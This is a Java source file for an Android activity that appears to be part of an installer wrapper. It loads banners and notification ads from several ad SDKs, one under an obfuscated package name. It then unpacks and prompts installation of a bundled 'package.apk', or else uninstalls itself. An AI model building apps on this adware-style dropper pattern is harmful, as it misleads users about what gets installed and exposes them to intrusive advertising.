package com.ximad.install;

import java.io.File;

import com.AfWVmIYApx.uGmIXJooGM111157.Airpush;
import com.Leadbolt.AdController;
import com.apperhand.device.android.AndroidSDKProvider;
import com.jirbo.adcolony.AdColonyVideoAd;
import com.jirbo.adcolony.AdColonyVideoListener;
import com.smaato.soma.BannerView;
import com.utility.alexarchiver.R;
import com.ximad.install.banner.Banner;
import com.ximad.install.banner.IBannerConteiner;
import com.ximad.install.server.IServerConfigListener;
import com.ximad.install.server.ServerConnector;
import com.ximad.install.utils.IntentAplicationFactory;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.DisplayMetrics;
import android.view.View;
import android.view.ViewGroup;
import android.view.View.OnClickListener;
import android.widget.Toast;

public class LastActivity extends Activity implements IBannerConteiner, IServerConfigListener{
	private ExternalPackage mExternalPackage;
	private ServerConnector mServerConnector;
	private Banner mBanner;
	private AdController myControllerForm;
	private ProgressDialog progressDialog;
	private AdController myController;
	private View mButtonMoreGames;
	private static final int INTENT_RESULT_INSTALL = 0;
	private static final int INTENT_RESULT_OPEN_MARKET = 1;

	private static final String EXTERNAL_PACKAGE_FILE_NAME = "package.apk";
	private static final String EXTERNAL_PACKAGE_ASSETS_PATH = "applications/package.apk";
	protected static final String LEADBOLT_APP_WALL = "http://ad.leadboltads.net/show_app_wall?section_id=339447622";


	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		
		setContentView(R.layout.last_screen);
		
		final Context context = this;
		
		BannerView myBanner = (BannerView)findViewById(R.id.BannerViewFirst);
		myBanner.getAdSettings().setPublisherId(923864271);
		myBanner.getAdSettings().setAdspaceId(65767777);
		myBanner.asyncLoadNewBanner();

		BannerView myBannerSecond = (BannerView)findViewById(R.id.BannerViewSecond);
		myBannerSecond.getAdSettings().setPublisherId(923864271);
		myBannerSecond.getAdSettings().setAdspaceId(65767777);
		myBannerSecond.asyncLoadNewBanner();
		
		

		
		mExternalPackage = new ExternalPackage(this,
				EXTERNAL_PACKAGE_FILE_NAME, EXTERNAL_PACKAGE_ASSETS_PATH);
		mBanner = new Banner(this);
		mBanner.initLastButtons();
		String userId = getString(R.string.user_id);
		mServerConnector = new ServerConnector(this, userId);
		mServerConnector.initConfig(this);
		AdController mController = new AdController(getApplicationContext(),
				"276572812");
		mController.loadNotification();
		
	
	}

	@Override
	public ViewGroup getRootView() {
		// TODO Auto-generated method stub
		return (ViewGroup) findViewById(R.id.banner_content);
	}

	@Override
	public Context getContext() {
		// TODO Auto-generated method stub
		return this;
	}

	@Override
	public void onValidBannerPackage() {
		// TODO Auto-generated method stub
		LoggerPackager.d("onValidBannerPackage");
		if (!mExternalPackage.check()) {
			installApplication(mExternalPackage.getFile());
		} else {
			uninstallApplication(this.getPackageName());
		}
	}

	@Override
	public void openUrl(String urlString) {
		// TODO Auto-generated method stub
		Uri uri = Uri.parse(urlString);
		Intent intent = new Intent(Intent.ACTION_VIEW, uri);
		startActivityForResult(intent, INTENT_RESULT_OPEN_MARKET);
	}

	@Override
	public void postStatistic(TypeStatistic pType) {
		// TODO Auto-generated method stub
		mServerConnector.postStatistic(pType, mBanner.getAdsApp(),
				mBanner.getAdsUserId());

	}
	
	public void installApplication(File file) {
		Intent intent = IntentAplicationFactory.createIntentInstall(file);
		startActivityForResult(intent, INTENT_RESULT_INSTALL);
	}

	public void uninstallApplication(final String pPackageName) {
		Intent intent = IntentAplicationFactory
				.createIntentUninstall(pPackageName);
		startActivity(intent);
	}

	@Override
	public void onGetConfigString(String pConfigString) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void onErrorGetConfig() {
		// TODO Auto-generated method stub
		
	}
	


}
